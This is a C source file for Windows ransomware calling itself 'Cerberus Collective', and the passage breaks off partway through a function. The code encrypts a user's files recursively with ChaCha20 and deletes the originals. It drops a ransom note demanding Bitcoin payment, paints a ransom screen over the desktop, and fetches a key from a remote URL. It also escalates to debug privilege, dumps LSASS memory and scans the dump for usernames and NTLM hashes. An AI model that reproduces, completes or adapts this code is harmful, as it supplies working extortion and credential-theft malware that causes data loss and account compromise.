#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <io.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <dbghelp.h>
#include <sspi.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <strsafe.h>

#ifdef _MSC_VER
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#endif

#define KEY_SIZE 32
#define NONCE_SIZE 12
#define ENCRYPTED_EXT ".cerberus"
#define RANSOM_NOTE "README_DECRYPT.txt"
#define MAX_USERNAME_LENGTH 256
#define MAX_HASH_LENGTH 64
#define MAX_TARGETS 254
#define DUMP_FILE_PATH "C:\\Windows\\Temp\\lsass.dmp"
#define MAX_NOTE_LENGTH 2048
#define TEMP_DIR "C:\\Windows\\Temp\\"
#define RANSOM_MESSAGE "YOUR FILES HAVE BEEN ENCRYPTED BY CERBERUS COLLECTIVE"
#define MAX_CREDENTIALS 10
#define HASH_SIZE 16
#define LSA_BLOB_SIGNATURE { 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
#define UNICODE_STRING_MAX_LENGTH 256
#define DECRYPTION_KEY_URL "https://raw.githubusercontent.com/user/repo/main/decryption_key.bin"
#define PAYMENT_URL "hxxps://pay.cerberus-collective.com"
#define HASH_TABLE_SIZE 1009
#define TOP_HASHES 5
#define NETWORK_TIMEOUT 50

typedef struct _CHACHA20_CTX {
    DWORD input[16];
    DWORD output[16];
    DWORD idx;
} CHACHA20_CTX;

typedef struct _ENCRYPTION_KEY {
    BYTE key[KEY_SIZE];
    BYTE nonce[NONCE_SIZE];
} ENCRYPTION_KEY;

typedef struct _CREDENTIAL {
    char username[MAX_USERNAME_LENGTH];
    BYTE ntlm_hash[MAX_HASH_LENGTH];
} CREDENTIAL;

typedef struct _TARGET_INFO {
    char ip[16];
    BOOL smb_open;
} TARGET_INFO;

typedef struct _KIWI_PRIMARY_CREDENTIAL {
    DWORD unk0;
    DWORD unk1;
    DWORD unk2;
    LPWSTR UserName;
    DWORD UserNameLength;
    LPWSTR Domaine;
    DWORD DomaineLength;
    LPWSTR Password;
    DWORD PasswordLength;
} KIWI_PRIMARY_CREDENTIAL, *PKIWI_PRIMARY_CREDENTIAL;

typedef struct _LSAISO_DATA_BLOB {
    DWORD Size;
    DWORD Unknown1;
    DWORD Unknown2;
    DWORD Unknown3;
    DWORD Unknown4;
    DWORD Unknown5;
    DWORD DataOffset;
    DWORD DataSize;
} LSAISO_DATA_BLOB, *PLSAISO_DATA_BLOB;

typedef struct _HASH_ENTRY {
    BYTE hash[HASH_SIZE];
    int count;
    struct _HASH_ENTRY *next;
} HASH_ENTRY, *PHASH_ENTRY;

typedef struct _HASH_TABLE {
    PHASH_ENTRY buckets[HASH_TABLE_SIZE];
    int count;
} HASH_TABLE, *PHASH_TABLE;

void chacha20_block(CHACHA20_CTX *ctx) {
    int i;
    for (i = 0; i < 16; i++) ctx->input[i] = ctx->output[i];
    
    for (i = 0; i < 10; i++) {
        ctx->output[0] += ctx->output[4]; ctx->output[12] ^= ctx->output[0]; ctx->output[12] = _rotl(ctx->output[12], 16);
        ctx->output[8] += ctx->output[12]; ctx->output[4] ^= ctx->output[8]; ctx->output[4] = _rotl(ctx->output[4], 12);
        ctx->output[0] += ctx->output[4]; ctx->output[12] ^= ctx->output[0]; ctx->output[12] = _rotl(ctx->output[12], 8);
        ctx->output[8] += ctx->output[12]; ctx->output[4] ^= ctx->output[8]; ctx->output[4] = _rotl(ctx->output[4], 7);
        
        ctx->output[1] += ctx->output[5]; ctx->output[13] ^= ctx->output[1]; ctx->output[13] = _rotl(ctx->output[13], 16);
        ctx->output[9] += ctx->output[13]; ctx->output[5] ^= ctx->output[9]; ctx->output[5] = _rotl(ctx->output[5], 12);
        ctx->output[1] += ctx->output[5]; ctx->output[13] ^= ctx->output[1]; ctx->output[13] = _rotl(ctx->output[13], 8);
        ctx->output[9] += ctx->output[13]; ctx->output[5] ^= ctx->output[9]; ctx->output[5] = _rotl(ctx->output[5], 7);
        
        ctx->output[2] += ctx->output[6]; ctx->output[14] ^= ctx->output[2]; ctx->output[14] = _rotl(ctx->output[14], 16);
        ctx->output[10] += ctx->output[14]; ctx->output[6] ^= ctx->output[10]; ctx->output[6] = _rotl(ctx->output[6], 12);
        ctx->output[2] += ctx->output[6]; ctx->output[14] ^= ctx->output[2]; ctx->output[14] = _rotl(ctx->output[14], 8);
        ctx->output[10] += ctx->output[14]; ctx->output[6] ^= ctx->output[10]; ctx->output[6] = _rotl(ctx->output[6], 7);
        
        ctx->output[3] += ctx->output[7]; ctx->output[15] ^= ctx->output[3]; ctx->output[15] = _rotl(ctx->output[15], 16);
        ctx->output[11] += ctx->output[15]; ctx->output[7] ^= ctx->output[11]; ctx->output[7] = _rotl(ctx->output[7], 12);
        ctx->output[3] += ctx->output[7]; ctx->output[15] ^= ctx->output[3]; ctx->output[15] = _rotl(ctx->output[15], 8);
        ctx->output[11] += ctx->output[15]; ctx->output[7] ^= ctx->output[11]; ctx->output[7] = _rotl(ctx->output[7], 7);
        
        ctx->output[0] += ctx->output[5]; ctx->output[15] ^= ctx->output[0]; ctx->output[15] = _rotl(ctx->output[15], 16);
        ctx->output[10] += ctx->output[15]; ctx->output[5] ^= ctx->output[10]; ctx->output[5] = _rotl(ctx->output[5], 12);
        ctx->output[0] += ctx->output[5]; ctx->output[15] ^= ctx->output[0]; ctx->output[15] = _rotl(ctx->output[15], 8);
        ctx->output[10] += ctx->output[15]; ctx->output[5] ^= ctx->output[10]; ctx->output[5] = _rotl(ctx->output[5], 7);
        
        ctx->output[1] += ctx->output[6]; ctx->output[12] ^= ctx->output[1]; ctx->output[12] = _rotl(ctx->output[12], 16);
        ctx->output[11] += ctx->output[12]; ctx->output[6] ^= ctx->output[11]; ctx->output[6] = _rotl(ctx->output[6], 12);
        ctx->output[1] += ctx->output[6]; ctx->output[12] ^= ctx->output[1]; ctx->output[12] = _rotl(ctx->output[12], 8);
        ctx->output[11] += ctx->output[12]; ctx->output[6] ^= ctx->output[11]; ctx->output[6] = _rotl(ctx->output[6], 7);
        
        ctx->output[2] += ctx->output[7]; ctx->output[13] ^= ctx->output[2]; ctx->output[13] = _rotl(ctx->output[13], 16);
        ctx->output[8] += ctx->output[13]; ctx->output[7] ^= ctx->output[8]; ctx->output[7] = _rotl(ctx->output[7], 12);
        ctx->output[2] += ctx->output[7]; ctx->output[13] ^= ctx->output[2]; ctx->output[13] = _rotl(ctx->output[13], 8);
        ctx->output[8] += ctx->output[13]; ctx->output[7] ^= ctx->output[8]; ctx->output[7] = _rotl(ctx->output[7], 7);
        
        ctx->output[3] += ctx->output[4]; ctx->output[14] ^= ctx->output[3]; ctx->output[14] = _rotl(ctx->output[14], 16);
        ctx->output[9] += ctx->output[14]; ctx->output[4] ^= ctx->output[9]; ctx->output[4] = _rotl(ctx->output[4], 12);
        ctx->output[3] += ctx->output[4]; ctx->output[14] ^= ctx->output[3]; ctx->output[14] = _rotl(ctx->output[14], 8);
        ctx->output[9] += ctx->output[14]; ctx->output[4] ^= ctx->output[9]; ctx->output[4] = _rotl(ctx->output[4], 7);
    }
    
    for (i = 0; i < 16; i++) ctx->output[i] += ctx->input[i];
}

void chacha20_init(CHACHA20_CTX *ctx, const BYTE *key, const BYTE *nonce) {
    const char *constants = "expand 32-byte k";
    ctx->input[0] = ((DWORD*)constants)[0];
    ctx->input[1] = ((DWORD*)constants)[1];
    ctx->input[2] = ((DWORD*)constants)[2];
    ctx->input[3] = ((DWORD*)constants)[3];
    
    ctx->input[4] = ((DWORD*)key)[0];
    ctx->input[5] = ((DWORD*)key)[1];
    ctx->input[6] = ((DWORD*)key)[2];
    ctx->input[7] = ((DWORD*)key)[3];
    ctx->input[8] = ((DWORD*)key)[4];
    ctx->input[9] = ((DWORD*)key)[5];
    ctx->input[10] = ((DWORD*)key)[6];
    ctx->input[11] = ((DWORD*)key)[7];
    
    ctx->input[12] = 0;
    ctx->input[13] = ((DWORD*)nonce)[0];
    ctx->input[14] = ((DWORD*)nonce)[1];
    ctx->input[15] = ((DWORD*)nonce)[2];
    
    memcpy(ctx->output, ctx->input, sizeof(ctx->input));
    ctx->idx = 0;
}

void chacha20_encrypt(CHACHA20_CTX *ctx, const BYTE *in, BYTE *out, size_t len) {
    size_t i;
    for (i = 0; i < len; i++) {
        if (ctx->idx == 0) {
            chacha20_block(ctx);
            ctx->input[12]++;
            if (ctx->input[12] == 0) {
                ctx->input[13]++;
                if (ctx->input[13] == 0) {
                    ctx->input[14]++;
                }
            }
        }
        
        out[i] = in[i] ^ ctx->output[ctx->idx];
        ctx->idx = (ctx->idx + 1) % 64;
    }
}

void generate_victim_id(char *victim_id, size_t max_len) {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    char userName[MAX_PATH];
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    HCRYPTPROV hProv = 0;
    BYTE hash[32];
    char hashHex[65];
    int i;
    
    GetComputerNameA(computerName, &size);
    size = MAX_PATH;
    GetUserNameA(userName, &size);
    
    if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
        HCRYPTHASH hHash = 0;
        
        if (CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
            CryptHashData(hHash, (BYTE*)computerName, strlen(computerName), 0);
            CryptHashData(hHash, (BYTE*)userName, strlen(userName), 0);
            
            DWORD hashLen = 32;
            CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashLen, 0);
            
            for (i = 0; i < 32; i++) {
                sprintf_s(&hashHex[i * 2], 3, "%02x", hash[i]);
            }
            hashHex[64] = 0;
            
            CryptDestroyHash(hHash);
        }
        CryptReleaseContext(hProv, 0);
    }
    
    StringCchCopyA(victim_id, max_len, hashHex);
}

BOOL get_decryption_key_from_github(ENCRYPTION_KEY *key) {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL result = FALSE;
    DWORD bytesRead = 0;
    BYTE buffer[sizeof(ENCRYPTION_KEY)];
    URL_COMPONENTS urlComponents;
    WCHAR hostname[256], path[1024];
    WCHAR wideUrl[2048];
    DWORD lastError = 0;
    
    MultiByteToWideChar(CP_ACP, 0, DECRYPTION_KEY_URL, -1, wideUrl, sizeof(wideUrl) / sizeof(WCHAR));
    
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)", 
                          WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                          WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        lastError = GetLastError();
        OutputDebugStringA("WinHttpOpen failed");
        return FALSE;
    }
    
    ZeroMemory(&urlComponents, sizeof(urlComponents));
    urlComponents.dwStructSize = sizeof(urlComponents);
    urlComponents.lpszHostName = hostname;
    urlComponents.dwHostNameLength = sizeof(hostname) / sizeof(WCHAR);
    urlComponents.lpszUrlPath = path;
    urlComponents.dwUrlPathLength = sizeof(path) / sizeof(WCHAR);
    
    if (!WinHttpCrackUrl(wideUrl, 0, 0, &urlComponents)) {
        lastError = GetLastError();
        OutputDebugStringA("WinHttpCrackUrl failed");
        goto cleanup;
    }
    
    hConnect = WinHttpConnect(hSession, hostname, urlComponents.nPort, 0);
    if (!hConnect) {
        lastError = GetLastError();
        OutputDebugStringA("WinHttpConnect failed");
        goto cleanup;
    }
    
    hRequest = WinHttpOpenRequest(hConnect, L"GET", path, 
                                 NULL, WINHTTP_NO_REFERER, 
                                 WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                 (urlComponents.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        lastError = GetLastError();
        OutputDebugStringA("WinHttpOpenRequest failed");
        goto cleanup;
    }
    
    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        lastError = GetLastError();
        OutputDebugStringA("WinHttpSendRequest failed");
        goto cleanup;
    }
    
    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        lastError = GetLastError();
        OutputDebugStringA("WinHttpReceiveResponse failed");
        goto cleanup;
    }
    
    if (!WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
        lastError = GetLastError();
        OutputDebugStringA("WinHttpReadData failed");
        goto cleanup;
    }
    
    if (bytesRead == sizeof(ENCRYPTION_KEY)) {
        memcpy(key, buffer, sizeof(ENCRYPTION_KEY));
        result = TRUE;
    }
    
cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    
    return result;
}

void encrypt_file(const char *filename, ENCRYPTION_KEY *key) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD fileSize, bytesRead, bytesWritten;
    BYTE *fileBuffer = NULL;
    char encryptedFile[MAX_PATH];
    CHACHA20_CTX ctx;
    
    hFile = CreateFileA(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    
    fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize > 100 * 1024 * 1024) {
        CloseHandle(hFile);
        return;
    }
    
    fileBuffer = (BYTE*)malloc(fileSize);
    if (!fileBuffer) {
        CloseHandle(hFile);
        return;
    }
    
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(fileBuffer);
        CloseHandle(hFile);
        return;
    }
    
    CloseHandle(hFile);
    
    chacha20_init(&ctx, key->key, key->nonce);
    chacha20_encrypt(&ctx, fileBuffer, fileBuffer, fileSize);
    
    StringCchCopyA(encryptedFile, sizeof(encryptedFile), filename);
    StringCchCatA(encryptedFile, sizeof(encryptedFile), ENCRYPTED_EXT);
    
    hFile = CreateFileA(encryptedFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        free(fileBuffer);
        return;
    }
    
    WriteFile(hFile, fileBuffer, fileSize, &bytesWritten, NULL);
    CloseHandle(hFile);
    free(fileBuffer);
    
    DeleteFileA(filename);
}

void encrypt_directory(const char *dirPath, ENCRYPTION_KEY *key) {
    WIN32_FIND_DATAA findData;
    HANDLE hFind = NULL;
    char searchPath[MAX_PATH], filePath[MAX_PATH];
    
    StringCchCopyA(searchPath, sizeof(searchPath), dirPath);
    StringCchCatA(searchPath, sizeof(searchPath), "\\*");
    
    hFind = FindFirstFileA(searchPath, &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0)
            continue;
            
        StringCchCopyA(filePath, sizeof(filePath), dirPath);
        StringCchCatA(filePath, sizeof(filePath), "\\");
        StringCchCatA(filePath, sizeof(filePath), findData.cFileName);
        
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_directory(filePath, key);
        } else {
            const char *ext = strrchr(findData.cFileName, '.');
            if (ext && (strcmp(ext, ".exe") == 0 || strcmp(ext, ".dll") == 0 || 
                       strcmp(ext, ".sys") == 0 || strcmp(ext, ".cerberus") == 0))
                continue;
                
            encrypt_file(filePath, key);
        }
    } while (FindNextFileA(hFind, &findData));
    
    FindClose(hFind);
}

void create_ransom_note() {
    HANDLE hFile;
    DWORD bytesWritten;
    char notePath[MAX_PATH];
    char desktopPath[MAX_PATH];
    char victimId[65];
    char noteContent[MAX_NOTE_LENGTH];
    
    generate_victim_id(victimId, sizeof(victimId));
    
    sprintf_s(noteContent, sizeof(noteContent), 
        "YOUR FILES HAVE BEEN ENCRYPTED BY CERBERUS COLLECTIVE\n\n"
        "All your documents, photos, databases, and other important files have been locked with our unique encryption.\n"
        "You cannot access them right now.\n\n"
        "To get your files back, you need to pay a ransom in Bitcoin.\n"
        "The price depends on how fast you contact us.\n\n"
        "Visit our payment portal at: %s\n\n"
        "Your personal ID is: %s\n\n"
        "Enter this ID on the payment portal to receive your decryption key.\n\n"
        "Do not try to recover your files yourself. Any attempt to modify or rename the files will result in permanent data loss.\n"
        "If you do not pay within 72 hours, your files will be permanently deleted.\n\n"
        "CERBERUS COLLECTIVE", PAYMENT_URL, victimId);
    
    SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
    StringCchCopyA(notePath, sizeof(notePath), desktopPath);
    StringCchCatA(notePath, sizeof(notePath), "\\");
    StringCchCatA(notePath, sizeof(notePath), RANSOM_NOTE);
    
    hFile = CreateFileA(notePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, noteContent, (DWORD)strlen(noteContent), &bytesWritten, NULL);
        CloseHandle(hFile);
    }
}

void display_ransomware_screen() {
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetDC(hwnd);
    RECT rect;
    HBRUSH hBrush, hOldBrush;
    HFONT hFont, hOldFont;
    
    GetWindowRect(hwnd, &rect);
    
    hBrush = CreateSolidBrush(RGB(0, 0, 0));
    hOldBrush = (HBRUSH)SelectObject(hdc, hBrush);
    Rectangle(hdc, 0, 0, rect.right, rect.bottom);
    
    hBrush = CreateSolidBrush(RGB(75, 0, 130));
    SelectObject(hdc, hBrush);
    Rectangle(hdc, rect.right/4, rect.bottom/4, 3*rect.right/4, 3*rect.bottom/4);
    
    hFont = CreateFont(48, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, 
                      DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, 
                      CLEARTYPE_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
    hOldFont = (HFONT)SelectObject(hdc, hFont);
    
    SetTextColor(hdc, RGB(0, 255, 127));
    SetBkMode(hdc, TRANSPARENT);
    TextOutA(hdc, rect.right/2 - 400, rect.bottom/2 - 50, RANSOM_MESSAGE, strlen(RANSOM_MESSAGE));
    
    SelectObject(hdc, hOldFont);
    SelectObject(hdc, hOldBrush);
    DeleteObject(hBrush);
    DeleteObject(hFont);
    ReleaseDC(hwnd, hdc);
}

BOOL enable_debug_privilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;
    
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
        CloseHandle(hToken);
        return FALSE;
    }
    
    CloseHandle(hToken);
    return TRUE;
}

DWORD find_lsass_pid() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, "lsass.exe") == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

BOOL dump_lsass_hashes() {
    DWORD lsass_pid = find_lsass_pid();
    if (lsass_pid == 0) return FALSE;
    
    if (!enable_debug_privilege()) {
        OutputDebugStringA("Failed to enable SeDebugPrivilege");
        return FALSE;
    }
    
    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsass_pid);
    if (hProcess == NULL) return FALSE;
    
    HANDLE hFile = CreateFileA(DUMP_FILE_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
        return FALSE;
    }
    
    BOOL result = MiniDumpWriteDump(hProcess, lsass_pid, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    
    CloseHandle(hFile);
    CloseHandle(hProcess);
    
    return result;
}

BOOL is_valid_pointer(BYTE *buffer, DWORD bufferSize, DWORD_PTR ptr) {
    return ptr >= (DWORD_PTR)buffer && ptr < (DWORD_PTR)buffer + bufferSize;
}

BOOL is_likely_hash(BYTE* data) {
    BOOL uniqueBytes[256] = { FALSE };
    int uniqueCount = 0;
    
    for (int i = 0; i < HASH_SIZE; i++) {
        if (!uniqueBytes[data[i]]) {
            uniqueBytes[data[i]] = TRUE;
            uniqueCount++;
            
            if (uniqueCount >= 8) {
                return TRUE;
            }
        }
    }
    
    return (uniqueCount >= 8);
}

BOOL add_unique_credential(CREDENTIAL* list, int* count, CREDENTIAL* new_cred) {
    for (int i = 0; i < *count; i++) {
        if (_stricmp(list[i].username, new_cred->username) == 0) {
            return FALSE;
        }
    }
    
    if (*count < MAX_CREDENTIALS) {
        StringCchCopyA(list[*count].username, MAX_USERNAME_LENGTH, new_cred->username);
        memcpy(list[*count].ntlm_hash, new_cred->ntlm_hash, HASH_SIZE);
        (*count)++;
        return TRUE;
    }
    
    return FALSE;
}

BOOL init_hash_table(PHASH_TABLE table) {
    ZeroMemory(table, sizeof(HASH_TABLE));
    table->count = 0;
    return TRUE;
}

DWORD hash_function(BYTE* hash) {
    DWORD result = 0;
    for (int i = 0; i < HASH_SIZE; i++) {
        result = (result * 31 + hash[i]) % HASH_TABLE_SIZE;
    }
    return result;
}

void add_to_hash_table(PHASH_TABLE table, BYTE* hash) {
    DWORD index = hash_function(hash);
    PHASH_ENTRY entry = table->buckets[index];
    
    while (entry != NULL) {
        if (memcmp(entry->hash, hash, HASH_SIZE) == 0) {
            entry->count++;
            return;
        }
        entry = entry->next;
    }
    
    PHASH_ENTRY newEntry = (PHASH_ENTRY)malloc(sizeof(HASH_ENTRY));
    if (newEntry == NULL) return;
    
    memcpy(newEntry->hash, hash, HASH_SIZE);
    newEntry->count = 1;
    newEntry->next = table->buckets[index];
    table->buckets[index] = newEntry;
    table->count++;
}

int get_top_hashes(PHASH_TABLE table, CREDENTIAL* topHashes, int n) {
    if (table->count == 0 || n <= 0) return 0;
    
    HASH_ENTRY** entries = (HASH_ENTRY**)malloc(table->count * sizeof(PHASH_ENTRY));
    if (entries == NULL) return 0;
    
    int index = 0;
    for (int i = 0; i < HASH_TABLE_SIZE; i++) {
        PHASH_ENTRY entry = table->buckets[i];
        while (entry != NULL) {
            entries[index++] = entry;
            entry = entry->next;
        }
    }
    
    int result = min(n, table->count);
    for (int i = 0; i < result; i++) {
        int maxIndex = i;
        for (int j = i + 1; j < table->count; j++) {
            if (entries[j]->count > entries[maxIndex]->count) {
                maxIndex = j;
            }
        }
        
        PHASH_ENTRY temp = entries[i];
        entries[i] = entries[maxIndex];
        entries[maxIndex] = temp;
        
        memcpy(topHashes[i].ntlm_hash, entries[i]->hash, HASH_SIZE);
    }
    
    free(entries);
    return result;
}

void free_hash_table(PHASH_TABLE table) {
    for (int i = 0; i < HASH_TABLE_SIZE; i++) {
        PHASH_ENTRY entry = table->buckets[i];
        while (entry != NULL) {
            PHASH_ENTRY next = entry->next;
            free(entry);
            entry = next;
        }
    }
    ZeroMemory(table, sizeof(HASH_TABLE));
}

int parse_lsa_blob_structures(BYTE *buffer, DWORD bufferSize, CREDENTIAL *credentials, int maxCredentials) {
    BYTE signature[] = LSA_BLOB_SIGNATURE;
    int found = 0;
    
    for (DWORD i = 0; i < bufferSize - sizeof(LSAISO_DATA_BLOB); i++) {
        if (memcmp(buffer + i, signature, sizeof(signature)) == 0) {
            PLSAISO_DATA_BLOB blob = (PLSAISO_DATA_BLOB)(buffer + i);
            
            if (blob->Size > 0 && blob->Size < 0x10000 && 
                blob->DataOffset > 0 && blob->DataOffset < bufferSize &&
                blob->DataSize > 0 && blob->DataSize < 0x1000 &&
                is_valid_pointer(buffer, bufferSize, (DWORD_PTR)buffer + blob->DataOffset)) {
                
                BYTE *dataPtr = buffer + blob->DataOffset;
                
                for (DWORD j = 0; j < blob->DataSize - HASH_SIZE - 4; j++) {
                    if (dataPtr[j] >= 'A' && dataPtr[j] <= 'Z' && 
                        dataPtr[j+2] >= 'a' && dataPtr[j+2] <= 'z') {
                        
                        WCHAR usernameW[UNICODE_STRING_MAX_LENGTH];
                        int usernameLen = 0;
                        
                        while (usernameLen < UNICODE_STRING_MAX_LENGTH - 1 && 
                               j + usernameLen*2 < blob->DataSize &&
                               dataPtr[j + usernameLen*2] != 0) {
                            usernameW[usernameLen] = *(WCHAR*)(dataPtr + j + usernameLen*2);
                            usernameLen++;
                        }
                        usernameW[usernameLen] = 0;
                        
                        if (usernameLen > 2) {
                            for (DWORD k = j + usernameLen*2; k < blob->DataSize - HASH_SIZE; k++) {
                                if (is_likely_hash(dataPtr + k)) {
                                    CREDENTIAL newCred;
                                    
                                    WideCharToMultiByte(CP_ACP, 0, usernameW, -1, 
                                                       newCred.username, 
                                                       MAX_USERNAME_LENGTH, NULL, NULL);
                                    
                                    memcpy(newCred.ntlm_hash, dataPtr + k, HASH_SIZE);
                                    
                                    if (add_unique_credential(credentials, &found, &newCred)) {
                                        if (found >= maxCredentials) {
                                            return found;
                                        }
                                    }
                                    
                                    j = k + HASH_SIZE;
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    return found;
}

int find_unicode_strings(BYTE *buffer, DWORD bufferSize, CREDENTIAL *credentials, int maxCredentials) {
    int found = 0;
    
    for (DWORD i = 0; i < bufferSize - UNICODE_STRING_MAX_LENGTH*2; i++) {
        BOOL isValidString = TRUE;
        WCHAR testString[UNICODE_STRING_MAX_LENGTH];
        int strLen = 0;
        
        for (int j = 0; j < UNICODE_STRING_MAX_LENGTH; j++) {
            if (i + j*2 >= bufferSize) {
                isValidString = FALSE;
                break;
            }
            
            WCHAR c = *(WCHAR*)(buffer + i + j*2);
            testString[j] = c;
            
            if (c == 0) {
                strLen = j;
                break;
            }
            
            if (!((c >= 'A' && c <= 'Z') || 
                  (c >= 'a' && c <= 'z') || 
                  (c >= '0' && c <= '9') || 
                  c == '_' || c == '-' || c == '.')) {
                isValidString = FALSE;
                break;
            }
        }
        
        if (isValidString && strLen > 2) {
            for (DWORD j = i + strLen*2; j < i + strLen*2 + 512 && j < bufferSize - HASH_SIZE; j++) {
                if (is_likely_hash(buffer + j)) {
                    CREDENTIAL newCred;
                    
                    WideCharToMultiByte(CP_ACP, 0, testString, -1, 
                                       newCred.username, 
                                       MAX_USERNAME_LENGTH, NULL, NULL);
                    
                    memcpy(newCred.ntlm_hash, buffer + j, HASH_SIZE);
                    
                    if (add_unique_credential(credentials, &found, &newCred)) {
                        if (found >= maxCredentials) {
                            return found;
                        }
                    }
                    
                    i = j + HASH_SIZE;
                    break;
                }
            }
        }
    }
    
    return found;
}

int find_frequent_hashes(BYTE *buffer, DWORD bufferSize, CREDENTIAL *credentials, int maxCredentials) {
    HASH_TABLE hashTable;
    if (!init_hash_table(&hashTable)) return 0;
    
    for (DWORD i = 0; i < bufferSize - HASH_SIZE; i++) {
        if (is_likely_hash(buffer + i)) {
            add_to_hash_table(&hashTable, buffer + i);
        }
    }
    
    CREDENTIAL topHashes[TOP_HASHES];
    int topCount = get_top_hashes(&hashTable, topHashes, TOP_HASHES);
    
    int found = 0;
    
    for (int i = 0; i < topCount && found < maxCredentials; i++) {
        for (DWORD j = 0; j < bufferSize - HASH_SIZE; j++) {
            if (memcmp(topHashes[i].ntlm_hash, buffer + j, HASH_SIZE) == 0) {
                for (DWORD k = max(0, (int)j - 512); k < j; k++) {
                    BOOL isValidString = TRUE;
                    WCHAR testString[UNICODE_STRING_MAX_LENGTH];
                    int strLen = 0;
                    
                    for (int l = 0; l < UNICODE_STRING_MAX_LENGTH; l++) {
                        if (k + l*2 >= bufferSize) {
                            isValidString = FALSE;
                            break;
                        }
                        
                        WCHAR c = *(WCHAR*)(buffer + k + l*2);
                        testString[l] = c;
                        
                        if (c == 0) {
                            strLen = l;
                            break;
                        }
                        
                        if (!((c >= 'A' && c <= 'Z') || 
                              (c >= 'a' && c <= 'z') || 
                              (c >= '0' && c <= '9') || 
                              c == '_' || c == '-' || c == '.')) {
                            isValidString = FALSE;
                            break;
                        }
                    }
                    
                    if (isValidString && strLen > 2) {
                        CREDENTIAL newCred;
                        
                        WideCharToMultiByte(CP_ACP, 0, testString, -1, 
                                           newCred.username, 
                                           MAX_USERNAME_LENGTH, NULL, NULL);
                        
                        memcpy(newCred.ntlm_hash, topHashes[i].ntlm_hash, HASH_SIZE);
                        
                        if (add_unique_credential(credentials, &found, &newCred)) {
                            if (found >= maxCredentials) {
                                free_hash_table(&hashTable);
                                return found;
                            }
                        }
                        
                        break;
                    }
                }
            }
        }
    }
    
    free_hash_table(&hashTable);
    return found;
}

BOOL parse_lsass_dump(CREDENTIAL *credentials, int *credential_count) {
